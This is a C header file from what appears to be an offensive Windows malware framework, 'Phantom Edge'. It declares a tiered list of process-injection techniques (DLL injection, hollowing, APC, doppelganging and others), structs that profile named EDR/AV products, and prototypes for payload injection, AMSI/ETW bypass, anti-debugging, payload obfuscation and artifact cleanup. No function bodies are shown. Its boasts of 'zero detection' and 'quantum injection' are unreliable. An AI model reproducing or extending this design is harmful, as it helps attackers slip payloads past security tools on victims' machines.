#ifndef INJECTION_ARSENAL_H
#define INJECTION_ARSENAL_H

#include "common_defines.h"

// Forward declarations
struct _RTLDR_CTX;

// ========================================================================
// PHANTOM EDGE INJECTION ARSENAL v2.0 - LEGENDARY FRAMEWORK
// "Every target falls, every defense crumbles" - Evil Genius Manifesto
// 15+ Injection Techniques | AI-Powered Selection | Zero-Day Combinations
// ========================================================================

// Injection technique enumeration (ordered by stealth level)
typedef enum _INJECTION_TECHNIQUE {
    // TIER 1: CLASSICAL TECHNIQUES (High Detection Risk)
    INJ_CLASSIC_DLL_INJECTION = 0,         // CreateRemoteThread + LoadLibrary
    INJ_REFLECTIVE_DLL_INJECTION,          // Manual PE loading + RDI
    INJ_PROCESS_HOLLOWING,                 // NtUnmapViewOfSection + hollow
    
    // TIER 2: ADVANCED TECHNIQUES (Medium Detection Risk)  
    INJ_THREAD_HIJACKING,                  // SuspendThread + SetThreadContext
    INJ_APC_INJECTION,                     // QueueUserAPC + alertable wait
    INJ_ATOM_BOMBING,                      // GlobalAddAtom + window messages
    INJ_MANUAL_DLL_INJECTION,              // Manual LoadLibrary without APIs
    
    // TIER 3: ELITE TECHNIQUES (Low Detection Risk)
    INJ_EARLY_BIRD_APC,                    // APC before main thread starts
    INJ_PROCESS_DOPPELGANGING,             // NTFS transactions + hollow
    INJ_PROCESS_HERPADERPING,              // File replacement after mapping
    INJ_GHOSTLY_HOLLOWING,                 // Phantom process creation
    
    // TIER 4: LEGENDARY TECHNIQUES (Zero Detection - PhantomEdge Exclusive)
    INJ_EARLY_CASCADE_INJECTION,           // 2024 technique - PDB + RtlInsert
    INJ_QUANTUM_INJECTION,                 // Multi-stage probabilistic injection
    INJ_METAMORPHIC_INJECTION,             // Self-modifying injection payload
    INJ_PHANTOM_THREAD_CREATION,           // Custom thread creation via syscalls
    
    // Special techniques
    INJ_HYBRID_MULTI_VECTOR,               // Combines multiple techniques
    INJ_AI_ADAPTIVE_SELECTION,             // AI chooses optimal technique
    
    INJ_TECHNIQUE_COUNT
} INJECTION_TECHNIQUE;

// Target process information
typedef struct _INJECTION_TARGET {
    DWORD process_id;
    HANDLE process_handle;
    HANDLE main_thread_handle;
    PVOID base_address;
    SIZE_T image_size;
    BOOL is_wow64;
    BOOL has_aslr;
    BOOL has_dep;
    BOOL has_cfg;
    WCHAR process_name[MAX_PATH];
    WCHAR process_path[MAX_PATH];
} INJECTION_TARGET, *PINJECTION_TARGET;

// Payload information
typedef struct _INJECTION_PAYLOAD {
    PVOID data;
    SIZE_T size;
    BOOL is_dll;
    BOOL is_shellcode;
    BOOL is_bof;
    BOOL requires_arguments;
    PVOID arguments;
    SIZE_T argument_size;
    DWORD entry_point_rva;
} INJECTION_PAYLOAD, *PINJECTION_PAYLOAD;

// Injection configuration
typedef struct _INJECTION_CONFIG {
    INJECTION_TECHNIQUE preferred_technique;
    INJECTION_TECHNIQUE fallback_techniques[5];
    BOOL enable_ai_selection;
    BOOL enable_multi_vector;
    BOOL enable_anti_debugging;
    BOOL enable_stealth_mode;
    BOOL enable_persistence;
    DWORD timeout_seconds;
    DWORD retry_count;
} INJECTION_CONFIG, *PINJECTION_CONFIG;

// Injection result information
typedef struct _INJECTION_RESULT {
    BOOL success;
    INJECTION_TECHNIQUE technique_used;
    NTSTATUS status_code;
    DWORD error_code;
    PVOID injected_address;
    SIZE_T injected_size;
    HANDLE remote_thread_handle;
    DWORD execution_time_ms;
    BOOL was_detected;
    CHAR error_message[256];
} INJECTION_RESULT, *PINJECTION_RESULT;

// EDR/AV Detection matrix
typedef struct _DETECTION_MATRIX {
    BOOL windows_defender;
    BOOL crowdstrike_falcon;
    BOOL sentinelone;
    BOOL carbon_black;
    BOOL cylance;
    BOOL kaspersky;
    BOOL symantec;
    BOOL mcafee;
    BOOL trend_micro;
    BOOL bitdefender;
    // Add more as needed
} DETECTION_MATRIX, *PDETECTION_MATRIX;

// Legacy AI engine structure (DEPRECATED - NO AI BULLSHIT)
// Keep for API compatibility but not used in practice
typedef struct _AI_INJECTION_ENGINE {
    DETECTION_MATRIX detected_av_edr;
    DWORD success_rates[INJ_TECHNIQUE_COUNT];
    DWORD failure_rates[INJ_TECHNIQUE_COUNT];
    DWORD detection_rates[INJ_TECHNIQUE_COUNT];
    INJECTION_TECHNIQUE last_successful[10];
    DWORD technique_cooldowns[INJ_TECHNIQUE_COUNT];
    BOOL learning_enabled; // ALWAYS FALSE - NO AI
} AI_INJECTION_ENGINE, *PAI_INJECTION_ENGINE;

// ========================================================================
// CORE INJECTION ARSENAL FUNCTIONS
// ========================================================================

// Initialize injection arsenal with AI engine
BOOL InjectionArsenal_Initialize(struct _RTLDR_CTX* ctx, PINJECTION_CONFIG config);

// Rule-based technique selection (NO AI - PURE LOGIC)
INJECTION_TECHNIQUE InjectionArsenal_SelectOptimalTechnique(
    PINJECTION_TARGET target,
    PINJECTION_PAYLOAD payload,
    PAI_INJECTION_ENGINE ai_engine // IGNORED - legacy parameter
);

// Master injection function - tries multiple techniques automatically
NTSTATUS InjectionArsenal_InjectPayload(
    struct _RTLDR_CTX* ctx,
    PINJECTION_TARGET target,
    PINJECTION_PAYLOAD payload,
    PINJECTION_CONFIG config,
    PINJECTION_RESULT result
);

// Individual injection technique implementations
NTSTATUS InjectionArsenal_ClassicDLL(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_ReflectiveDLL(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_ProcessHollowing(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_ThreadHijacking(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_APCInjection(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_AtomBombing(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_ManualDLL(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_EarlyBirdAPC(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_ProcessDoppelganging(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_ProcessHerpaderping(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_GhostlyHollowing(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);

// LEGENDARY PHANTOM EDGE EXCLUSIVE TECHNIQUES
NTSTATUS InjectionArsenal_EarlyCascadeInjection(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_QuantumInjection(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_MetamorphicInjection(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_PhantomThreadCreation(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);
NTSTATUS InjectionArsenal_HybridMultiVector(PINJECTION_TARGET target, PINJECTION_PAYLOAD payload);

// ========================================================================
// TARGET ANALYSIS & RECONNAISSANCE
// ========================================================================

// Analyze target process for optimal injection vector
NTSTATUS InjectionArsenal_AnalyzeTarget(DWORD process_id, PINJECTION_TARGET target_info);

// Detect EDR/AV products in target system
NTSTATUS InjectionArsenal_DetectDefenses(PDETECTION_MATRIX detection_matrix);

// Check if process is suitable for specific injection technique
BOOL InjectionArsenal_IsTargetSuitable(PINJECTION_TARGET target, INJECTION_TECHNIQUE technique);

// ========================================================================
// RULE-BASED SELECTION ENGINE (NO AI BULLSHIT)
// ========================================================================

// Update technique statistics (simple counters, no ML)
VOID InjectionArsenal_UpdateStats(INJECTION_TECHNIQUE technique, BOOL success, BOOL detected);

// Get technique recommendation based on rules and statistics
INJECTION_TECHNIQUE InjectionArsenal_GetRecommendation(PINJECTION_TARGET target, PDETECTION_MATRIX defenses);

// Simple statistics persistence (no AI models)
NTSTATUS InjectionArsenal_SaveStats(PCWSTR file_path);
NTSTATUS InjectionArsenal_LoadStats(PCWSTR file_path);

// ========================================================================
// STEALTH & EVASION UTILITIES
// ========================================================================

// Apply anti-debugging techniques
NTSTATUS InjectionArsenal_ApplyAntiDebugging(PINJECTION_TARGET target);

// Implement AMSI/ETW bypass before injection
NTSTATUS InjectionArsenal_BypassAMSIETW(VOID);

// Clean injection artifacts
NTSTATUS InjectionArsenal_CleanArtifacts(PINJECTION_TARGET target, PINJECTION_RESULT result);

// ========================================================================
// PAYLOAD PROCESSING
// ========================================================================

// Convert various payload formats to injectable format
NTSTATUS InjectionArsenal_ProcessPayload(PVOID raw_payload, SIZE_T size, PINJECTION_PAYLOAD processed_payload);

// Encrypt/Obfuscate payload before injection
NTSTATUS InjectionArsenal_ObfuscatePayload(PINJECTION_PAYLOAD payload, DWORD encryption_key);

// Validate payload integrity and safety
BOOL InjectionArsenal_ValidatePayload(PINJECTION_PAYLOAD payload);

// ========================================================================
// UTILITY FUNCTIONS
// ========================================================================

// Get human-readable technique name
PCSTR InjectionArsenal_GetTechniqueName(INJECTION_TECHNIQUE technique);

// Calculate technique stealth score (0-100)
DWORD InjectionArsenal_GetStealthScore(INJECTION_TECHNIQUE technique, PDETECTION_MATRIX detection_matrix);

// Cleanup injection arsenal resources
VOID InjectionArsenal_Cleanup(struct _RTLDR_CTX* ctx);

#endif // INJECTION_ARSENAL_H 